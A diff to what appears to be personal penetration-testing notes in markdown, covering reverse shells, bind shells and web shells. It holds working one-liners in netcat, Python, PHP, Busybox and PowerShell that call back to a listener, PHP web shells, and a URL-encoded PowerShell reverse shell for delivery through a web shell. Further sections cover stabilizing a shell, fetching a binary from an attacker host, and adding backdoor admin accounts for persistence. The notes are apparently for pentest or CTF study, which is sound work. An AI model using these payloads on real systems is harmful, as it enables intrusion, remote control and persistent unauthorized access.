@@ -240,20 +240,22 @@ They can also be used for SSRF (Server-Side Request Forgery) to force the target
 
 ## Shells
 
-A lot of reverse and bind shell examples for many languages are available on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).
+A lot of reverse and bind shell examples for many languages are available on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and [PenTestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
 
 ### Reverse shell
 
 A reverse shell is a connection initiated by the target machine to the local machine.  
 This requires to have access to the target machine to force it to initiate this connection.  
 Reverse shells are more difficult to detect by firewalls, since they look like legitimate traffic.  
+When using a reverse shell, we need to setup our own network accessible from the target over the Internet.  
 
 We can use `netcat` to listen for an incoming connection on the local machine.  
 It can listen on any port, but the common ports (80, 443, 53, 139, 445) are often used to not raise suspicion.
 ```commandline
 nc -lvnp 1234
 ```
-Once we have a listening process locally, we can execute a payload to initiate the connection on the target machine.  
+
+Once we have a listening process locally, we can execute a payload to initiate the connection from the target machine.  
 The payload command to use will depend on the available languages and command versions on the target machine.
 
 Examples of reverse shell payload commands to connect to local machine `10.0.0.1` on port 1234 :
@@ -271,6 +273,7 @@ nc -e /bin/sh 10.0.0.1 1234
 # Netcat - without the -e option
 # It creates a pipe with "mkfifo", a netcat process that writes to it, and a bash process that reads from it
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 10.0.0.1 1234 >/tmp/f
+mkfifo /tmp/f; nc 10.0.0.1 1234 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f           # alternative
 
 # Python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -280,6 +283,9 @@ php -r '$sock=fsockopen("10.0.0.1",1234);system("sh <&3 >&3 2>&3");'
 
 # Busybox (bundle of tiny versions of many common UNIX utilities, including Netcat)
 busybox nc 10.0.0.1 1234 -e sh
+
+# PowerShell : one-liner that opens a reverse shell on a Windows machine by reaching out to a listener
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
 ### Bind Shell
@@ -293,6 +299,7 @@ It is similar to the reverse shell payload, but this time it waits for an incomi
 ```shell
 # on Linux
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+mkfifo /tmp/f; nc -lvnp 8080 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f                 # alternative
 
 # using netcat on Windows
 nc -l p 443 -e cmd.exe
@@ -312,7 +319,7 @@ It can be uploaded to the web server by exploiting an unrestricted file upload v
 Once uploaded to the web server, we just query its URL to have the web server execute arbitrary commands.  
 As part of penetration testing, we can try to upload this file to the web server to gain access to it.
 
-The below PHP script is a very simple web shell that takes a `cmd` parameter and executes it :
+The below PHP scripts expose a very simple web shell that takes a `cmd` parameter and executes it :
 ```php
 <?php
 if (isset($_GET['cmd'])) {
@@ -320,7 +327,111 @@ if (isset($_GET['cmd'])) {
 }
 ?>
 ```
+```php
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+```
 Some publicly available PHP web shells can be used, like the [p0wny-shell](https://github.com/flozz/p0wny-shell) or the [c99 shell](https://www.r57shell.net/single.php?id=13).  
+
+
+A webshell is often used to force the web server to run a command that connects to the attacker's listener to open a reverse shell.  
+This means that the command we give to the webshell is a command from the reverse shell section (URL encoded).  
+
+A useful example is to send to a Windows web server a command that runs powershell with a command opening a reverse-shell.  
+That can be done by using the following URL-encoded command, and replacing the `<IP>` and `PORT>` placeholders with the listener's info.
+```
+powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
+```
+
+Kali also contains some web shells under `/usr/share/webshells`.  
+It includes the PenTestMonkey [php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) that starts a reverse shell on the target machine when the PHP page is accessed.  
+It requires the attacker to have setup a listener and updated the IP and PORT values in the PHP webshell.
+
+
+### Shell stabilization
+
+Most of the reverse and bind shells we get to access a remote machine are non-interactive.  
+This means that they cannot run interactive commands requiring dynamic input from the user (like `ssh`).  
+
+There are multiple was to stabilize a shell :
+
+- **Python**  
+  Python is almost always available on Linux machines, so we can use it to start a better Bash shell.  
+  We can then set the `TERM` variable to `xterm` to allow to clear the screen, use arrows and interpret control characters.  
+  Finally we can background the process, turn off the terminal echo (allow auto-complete and prevent Ctrl-C) and foreground it :
+```shell
+# start a listener on the attacker machine to receive a reverse shell
+sudo nc -lvnp 443
+
+# once we received a connection and got a non-interactive reverse shell, start a Bash shell with Python  
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+# from the Bash shell, set the TERM variable
+export TERM=xterm
+
+# Ctr-Z to background the process
+^Z
+
+# set the terminal to prevent echo and transmit raw input, then foregroung the shell
+stty raw -echo; fg
+```
+ 
+
+- **rlwrap**  
+  `rlwrap` is a program that can wrap our NetCat listener command and provide history, auto-completion and arrow-keys support.  
+  This works as well on reverse shells from Windows machines, that are much harder to stabilize than Unix machines.  
+  On Linux, we can further stabilize it by backgrounding the shell and running `stty raw -echo; fg` as above.  
+```shell
+# wrap NetCat with rlwrap
+sudo apt install rlwrap
+rlwrap nc -lvnp 443
+```
+
+
+- **SoCat**  
+  We can use the initial NetCat shell as a stepping stone to start a SoCat shell.  
+  This is only efficient on Linux machines, because on Windows machine a SoCat shell is not more stable.  
+  We can first transfer a compiled version of the `socat` binary to the target machine (with a local webserver for example).  
+```shell
+# from a different terminal window, start a local web server in the folder containing the socat binary
+cd /usr/bin/
+sudo python3 -m http.server 80
+
+# from inside the NetCat reverse shell, download it
+wget <ATTACKER_IP>/socat -O /tmp/socat
+```
+
+No matter which of the above technique we use, we can specify the number of rows and columns of our attacking terminal.  
+This is required if we want to use text editors that overwrite the full screen (vim, nano...).  
+```shell
+# find the number of rows and columns in our terminal
+stty -a
+
+# from inside the reverse shell, set the number of rows and columns to the numbers shown by the above command
+stty rows <ROW_COUNT>
+stty cols <COL_COUNT>
+```
+
+
+### What next ?
+
+Bind shells, reverse shells and web shells give a great entry point in the system, but are not very stable.  
+Attackers usually use it to get more reliable access, with a user account.  
+
+- SSH keys stored under `/home/<user>/.ssh` could be cracked to SSH into the  system as this user
+- if we have admin privileges, we can create our own account in the system
+  - on Linux :
+  ```shell
+  sudo adduser <USERNAME>             # it will prompt for a password
+  sudo usermod -aG sudo <USERNAME>    # add the user to the sudoers
+  ```
+  - on Windows : 
+  ```shell
+  net user <USERNAME> <PASSWORD> /add
+  net localgroup administrators <USERNAME> /add
+  ```
+- sometimes `/etc/shadow` and `/etc/passwd` are writable (CTF only)
+
+
 
 
 ## Run a local webserver
